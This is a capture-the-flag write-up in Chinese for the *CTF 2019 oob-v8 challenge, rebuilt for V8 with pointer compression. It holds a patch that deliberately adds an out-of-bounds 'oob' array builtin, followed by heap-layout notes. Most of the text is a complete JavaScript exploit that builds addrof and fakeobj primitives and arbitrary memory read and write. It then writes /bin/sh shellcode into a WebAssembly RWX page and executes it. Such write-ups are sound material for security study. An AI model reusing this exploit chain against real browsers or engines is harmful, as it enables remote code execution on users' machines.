# OOB
Pointer compression is to reduce v8 memory usage.  
簡單來說在64位元的系統下用最低四位的byte來表示pointer。  
當要derefer pointer的時候再加最高四位的bytes，號稱能省下40%的記憶體得使用。  
對於v8 PWN的影響，*CTF 2019 oob-v8一道入門的v8題目build在最新的v8練習 . 
  
我修改了原本題目的patch，讓他可以在最新的v8下使用 . 

## Patch
```diff
diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc
index 40accae57a..c718234d04 100644
--- a/src/builtins/builtins-array.cc
+++ b/src/builtins/builtins-array.cc
@@ -360,6 +360,28 @@ V8_WARN_UNUSED_RESULT Object GenericArrayPush(Isolate* isolate,
 }
 }  // namespace
 
+BUILTIN(ArrayOob){
+    uint32_t len = args.length();
+    if(len > 2) return ReadOnlyRoots(isolate).undefined_value();
+    Handle<JSReceiver> receiver;
+    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
+            isolate, receiver, Object::ToObject(isolate, args.receiver()));
+    Handle<JSArray> array = Handle<JSArray>::cast(receiver);
+    FixedDoubleArray elements = FixedDoubleArray::cast(array->elements());
+    uint32_t length = static_cast<uint32_t>(array->length().Number());
+    if(len == 1){
+        //read
+        return *(isolate->factory()->NewNumber(elements.get_scalar(length)));
+    }else{
+        //write
+        Handle<Object> value;
+        ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
+                isolate, value, Object::ToNumber(isolate, args.at<Object>(1)));
+        elements.set(length,value->Number());
+        return ReadOnlyRoots(isolate).undefined_value();
+    }
+}
+
 BUILTIN(ArrayPush) {
   HandleScope scope(isolate);
   Handle<Object> receiver = args.receiver();
diff --git a/src/builtins/builtins-definitions.h b/src/builtins/builtins-definitions.h
index 1e2cfb9a31..47442eb545 100644
--- a/src/builtins/builtins-definitions.h
+++ b/src/builtins/builtins-definitions.h
@@ -350,6 +350,7 @@ namespace internal {
   /* https://tc39.github.io/proposal-flatMap/#sec-Array.prototype.flatMap */   \
   TFJ(ArrayPrototypeFlatMap, SharedFunctionInfo::kDontAdaptArgumentsSentinel)  \
                                                                                \
+  CPP(ArrayOob)								       \
   /* ArrayBuffer */                                                            \
   /* ES #sec-arraybuffer-constructor */                                        \
   CPP(ArrayBufferConstructor)                                                  \
diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc
index 14ec8566e3..4eacf7de57 100644
--- a/src/compiler/typer.cc
+++ b/src/compiler/typer.cc
@@ -1740,7 +1740,8 @@ Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) {
       return Type::Receiver();
     case Builtins::kArrayUnshift:
       return t->cache_->kPositiveSafeInteger;
-
+    case Builtins::kArrayOob:
+      return Type::Receiver();
     // ArrayBuffer functions.
     case Builtins::kArrayBufferIsView:
       return Type::Boolean();
diff --git a/src/init/bootstrapper.cc b/src/init/bootstrapper.cc
index eff03ae384..906784375e 100644
--- a/src/init/bootstrapper.cc
+++ b/src/init/bootstrapper.cc
@@ -1722,6 +1722,8 @@ void Genesis::InitializeGlobal(Handle<JSGlobalObject> global_object,
                           Builtins::kArrayPrototypeCopyWithin, 2, false);
     SimpleInstallFunction(isolate_, proto, "fill",
                           Builtins::kArrayPrototypeFill, 1, false);
+    SimpleInstallFunction(isolate_, proto, "oob",
+                          Builtins::kArrayOob,2,false);
     SimpleInstallFunction(isolate_, proto, "find",
                           Builtins::kArrayPrototypeFind, 1, false);
     SimpleInstallFunction(isolate_, proto, "findIndex",
```

## Debug
Build出一個debug版的v8 . 

```bash
fetch v8
cd v8
gclient sync
./tools/dev/v8gen.py x64.debug
ninja -C out.gn/x64.debug
```

從source code看Smi跟Pointer如何表示 . 
* src/objects/objects.h
```c=
// Formats of Object::ptr_:
//  Smi:        [31 bit signed int] 0
//  HeapObject: [32 bit direct pointer] (4 byte aligned) | 01
```

利用%DebugPrint跟gdb了解v8 Object Layout，可以看到 pointer 都是用4-byte表示
### Float Array Heap Layout

```javascript
var float_arr = [1.1, 1.2, 1.3, 1.4];
```
* %DebugPrint(float_arr)
```javascript=
DebugPrint: 0xc24080c5e95: [JSArray]
 - map: 0x0c2408201891 <Map(PACKED_DOUBLE_ELEMENTS)> [FastProperties]
 - prototype: 0x0c24081c8f7d <JSArray[0]>
 - elements: 0x0c24080c5e6d <FixedDoubleArray[4]> [PACKED_DOUBLE_ELEMENTS]
 - length: 4
 - properties: 0x0c24080406e9 <FixedArray[0]> {
    #length: 0x0c2408140165 <AccessorInfo> (const accessor descriptor)
 }
 - elements: 0x0c24080c5e6d <FixedDoubleArray[4]> {
           0: 1.1
           1: 1.2
           2: 1.3
           3: 1.4
 }
 
```
* x/4wx 0xc24080c5e95-1
```=
0xc24080c5e94:	0x08201891	0x080406e9	0x080c5e6d	0x00000008
```
* float array layout
```=
    map    |    properties    |    elements    |    length
```

### Object Array Heap Layout

```javascript
var obj = {"A":1};
var obj_arr = [obj];
```
* %DebugPrint(obj_arr)
```javascript
DebugPrint: 0xc24080c5e5d: [JSArray]
 - map: 0x0c24082018e1 <Map(PACKED_ELEMENTS)> [FastProperties]
 - prototype: 0x0c24081c8f7d <JSArray[0]>
 - elements: 0x0c24080c5e51 <FixedArray[1]> [PACKED_ELEMENTS]
 - length: 1
 - properties: 0x0c24080406e9 <FixedArray[0]> {
    #length: 0x0c2408140165 <AccessorInfo> (const accessor descriptor)
 }
 - elements: 0x0c24080c5e51 <FixedArray[1]> {
           0: 0x0c24080c5e25 <Object map = 0xc2408204e79>
 }
```
* x/4wx 0xc24080c5e5d-1
```
0xc24080c5e5c:	0x082018e1	0x080406e9	0x080c5e51	0x00000002
```
* object array layout
```
    map    |    properties    |    elements    |    length
```



## Exploit
詳細的漏洞細節可以參考[這篇](https://syedfarazabrar.com/2019-12-13-starctf-oob-v8-indepth/)
題目提供一個function叫oob可以 get/set (FixedDoubleArray*)elements\[length\]
* Leak float array 跟 object array 的 map
* 更改 float array 跟 object array 的 map 造出 addrof 跟 fakeobj
* fake 一個 float array(更改elements的值) 造出v8 heap內的任意讀寫（limit ab r/w)
* 修改 ArrayBuffer 的 buf address 造出真正的任意讀寫
* 利用 Webassembly 造出一個rwx page寫shellcode
* 執行shellcode 完成 exploit

exp.js
```javascript
// Useful type conversion function
var buf = new ArrayBuffer(8); 
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function ftoi(val) { 
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); 
}

function itof(val) { 
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}

// Creat a object array and a float array

var obj = {"A":1};
var obj_arr = [obj];
var float_arr = [1.1, 1.2, 1.3, 1.4];

// shift right 4 bytes element buf to get object map
f64_buf[0] = obj_arr.oob();
u64_buf[1] = u64_buf[1] - 4;
obj_arr.oob(f64_buf[0]);
// oob to get object map
f64_buf[0] = obj_arr.oob();
var obj_map = u64_buf[0];

// oob to get float map
f64_buf[0] = float_arr.oob();
var float_map = u64_buf[0];

console.log("Obj_map 0x"+obj_map.toString(16));
console.log("Float_map 0x"+float_map.toString(16));

function addrof(in_obj) {
    //save original map
    var org = obj_arr.oob();
    
    //modify map to float_map
    f64_buf[0] = org;
    u64_buf[0] = float_map;
   
    //assign object to index 0	
    obj_arr[0] = in_obj;

    //change object array to float array
    obj_arr.oob(f64_buf[0]);

    //leak that object address
    let addr = obj_arr[0]; 
    
    // set it back
    obj_arr.oob(org);

    //return BigInt address
    f64_buf[0] = addr;
    return u64_buf[0];
}



function fakeobj(addr) {
    
    //assign address to float array at index 0 
    u64_buf[0] = addr;
    float_arr[0] = f64_buf[0];


    //save original map
    var org = float_arr.oob();

    //modify map to object_map
    f64_buf[0] = org;
    u64_buf[0] = obj_map;

    //change float array to object array 
    float_arr.oob(f64_buf[0]);

    // get object 
    let fake = float_arr[0];

    // set it back
    float_arr.oob(org);

    // Return the object
    return fake;
}

// change element buf to the address we want to leak
function limit_read(addr){
	// | elements' buf | length | => both are 4 bytes
	// The first element is at offset 8 of the buf
	// Calculate the val we want to set  
	var val =  0x1000000000n - 8n + BigInt(addr);
	
	// identify as a pointer
	val = val+1n;

	// create a float array layout
	// | map | ???  | elements' buf | length | => (slice(0) make heap layout stable)
	var fake_obj_layout = [itof(BigInt(float_map)),itof(val)].slice(0);
	
	// Get fake flat array's element to leak address
	let fake_obj = fakeobj(addrof(fake_obj_layout) - 0x10);
	return fake_obj[0];
}

function limit_write(addr,v){
	// | elements' buf | length | => both are 4 bytes
	// The first element is at offset 8 of the buf
	// Calculate the val we want to set  
	var val =  0x1000000000n - 8n + BigInt(addr);
	
	// identify as a pointer
	val = val+1n;

	// create a float array layout
	// | map | ???  | elements' buf | length | => (slice(0) make heap layout stable)
	var fake_obj_layout = [itof(BigInt(float_map)),itof(val)].slice(0);
	
	// Get fake flat array's element and set value back
	let fake_obj = fakeobj(addrof(fake_obj_layout) - 0x10);
	fake_obj[0] = v;
}

// Creat another ArrayBuffer in order to get arbitrary read/write
var AB_buf = new ArrayBuffer(8); 

// Read/Write by float 
var AB_f64_buf = new Float64Array(AB_buf);

// Get the address AB_buf's heap stored
// Subtract one because it is a pointer
var heap_buf_offset = addrof(AB_f64_buf)+0x28-1;


function ab_read(addr){
	// set heap buf to addr
	limit_write(heap_buf_offset,addr);

	// read that addr
	return AB_f64_buf[0];
}
function ab_write(addr,val){

	// set heap buf to addr
	limit_write(heap_buf_offset,addr);
	
	// write val to addr
	AB_f64_buf[0]=val;
}


var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var f = wasm_instance.exports.main;

// Get rwx page address
var rwx = limit_read(addrof(wasm_instance)+0x68-1);

// execve("/bin/sh",0,0) shellcode
var shellcode = [
	0x6e69622fb848686an,
	0xe7894850732f2f2fn,
	0x2434810101697268n,
	0x6a56f63101010101n,
	0x894856e601485e08n,
	0x50f583b6ad231e6n,
	0xccccccccccccccccn,
]

// Write shellcode to the rwx page
for(let i=0;i<shellcode.length;i++){
	ab_write(rwx,itof(shellcode[i]));
	rwx = itof(ftoi(rwx)+8n);
}

// execute shellcode
f();

```
